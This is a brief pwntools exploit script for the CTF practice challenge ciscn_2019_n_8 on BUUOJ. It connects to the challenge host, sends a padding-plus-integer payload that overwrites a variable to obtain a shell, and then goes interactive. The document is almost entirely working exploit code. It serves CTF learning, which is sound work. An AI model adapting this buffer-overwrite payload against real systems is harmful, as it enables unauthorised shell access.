# exp

```python
from pwn import *
from LibcSearcher import *

content = 1
context(os='linux', arch='amd64', log_level='debug')

remote_env = 'node4.buuoj.cn:27118'
local_env = './ciscn_2019_n_8'

if content:
    sh = remote(remote_env.split(':')[0], int(remote_env.split(':')[1]))
else:
    sh = process(local_env)

payload = 'a' * 4 * 13 + p32(17)

sh.sendlineafter('What\'s your name?\n', payload)
sh.interactive()
```